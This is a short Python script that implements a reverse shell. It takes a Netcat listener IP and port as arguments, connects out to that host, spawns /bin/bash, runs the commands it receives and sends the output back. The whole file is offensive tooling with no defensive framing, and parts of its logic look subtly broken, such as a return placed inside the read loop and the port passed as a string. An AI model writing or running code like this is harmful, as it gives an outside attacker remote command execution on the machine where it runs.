import subprocess
import socket
import re
import argparse

class InteractiveCommand():
	""" Sets up an interactive session with a process and uses prompt to
	determine when input can be passed into the command."""
	def __init__(self, process, prompt):
		self.process = subprocess.Popen( process, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT )
		print( self.process )
		self.prompt = prompt
		self.wait_for_prompt()
		
	def wait_for_prompt(self):
		output = ""
		while not self.prompt.search(output):
			c = self.process.stdout.read(1)
			print( c )
			if c == "":     
				break
			output += c
			# Now we're at a prompt; return the output
			return output
			
	def command(self, command):
		self.process.stdin.write(command + "\n")
		return self.wait_for_prompt()

				 
def main():

	parser = argparse.ArgumentParser( description="Python Shell" )
	parser.add_argument( "-i", "--ip", dest="host", help="Netcat listener host IP", required=True )
	parser.add_argument( "-p", "--port", help="Netcat listener port", required=True )
	args = parser.parse_args()

	#cp = InteractiveCommand( "cmd.exe", re.compile(r"^C:\\.*>", re.M) )
	cp = InteractiveCommand( "/bin/bash", re.compile( r"^\w+@.+$", re.M ) )
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect( ( args.host, args.port ) )
	print( "Connecting" )
	sock.send("[*] Connection received.")
	while True:
		data = sock.recv(1024).strip()
		if data == 'quit': 
			break
		res = cp.command(data)
		sock.send(res)

main()
